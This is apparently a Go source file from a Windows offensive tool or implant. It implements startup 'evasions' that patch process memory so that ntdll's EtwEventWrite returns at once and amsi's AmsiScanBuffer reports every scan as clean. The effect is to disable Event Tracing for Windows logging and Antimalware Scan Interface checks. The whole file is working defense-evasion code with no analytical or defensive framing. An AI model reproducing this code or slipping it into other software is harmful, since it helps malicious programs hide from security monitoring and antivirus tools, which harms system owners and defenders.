//go:build windows

package main

import (
	"syscall"
	"unsafe"
)

const pageExecuteReadWrite = 0x40

// patchBytes overwrites the first len(patch) bytes at addr with patch,
// temporarily changing memory protection to RWX. Returns true on success.
func patchBytes(addr uintptr, patch []byte) bool {
	var oldProtect uint32
	ret, _, _ := procVirtualProt.Call(
		addr,
		uintptr(len(patch)),
		pageExecuteReadWrite,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return false
	}
	// Write patch bytes via WriteProcessMemory to avoid unsafe.Pointer arithmetic
	// that go vet flags. Using the current process handle (0xFFFFFFFFFFFFFFFF).
	var written uintptr
	ret2, _, _ := procWriteProcMem.Call(
		^uintptr(0), // current process pseudo-handle
		addr,
		uintptr(unsafe.Pointer(&patch[0])),
		uintptr(len(patch)),
		uintptr(unsafe.Pointer(&written)),
	)
	// Restore original protection.
	procVirtualProt.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	return ret2 != 0 && written == uintptr(len(patch))
}

// patchETW patches ntdll!EtwEventWrite to return 0 (STATUS_SUCCESS)
// immediately, preventing Event Tracing for Windows from recording events.
func patchETW() {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")
	if err := etwEventWrite.Find(); err != nil {
		return
	}
	// xor eax, eax; ret — returns 0
	patchBytes(etwEventWrite.Addr(), []byte{0x33, 0xC0, 0xC3})
}

// patchAMSI patches amsi!AmsiScanBuffer to return E_INVALIDARG, which causes
// AMSI consumers to treat all scans as clean.
func patchAMSI() {
	amsi := syscall.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
	if err := amsiScanBuffer.Find(); err != nil {
		// amsi.dll not loaded — nothing to patch.
		return
	}
	// mov eax, 0x80070057 (E_INVALIDARG); ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	patchBytes(amsiScanBuffer.Addr(), patch)
}

// applyEvasions runs all startup evasion patches.
func applyEvasions() {
	patchETW()
	patchAMSI()
}
